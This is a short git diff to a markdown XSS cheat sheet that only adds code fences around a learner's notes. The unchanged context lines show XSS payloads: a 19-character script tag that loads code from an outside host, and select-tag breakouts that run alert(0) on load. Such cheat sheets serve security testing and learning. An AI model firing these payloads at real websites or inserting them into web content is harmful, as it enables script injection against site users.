@@ -299,6 +299,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 - The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)
 
 ### Some notes from me when I start learning XSS 
+```
 when security of website is low 
 
 it not filter charset when we inject 
@@ -330,4 +331,6 @@ or
 
 >/option></select><body onload=alert(0)>
 </select><svg/onload=alert(0)>
+
+```
 
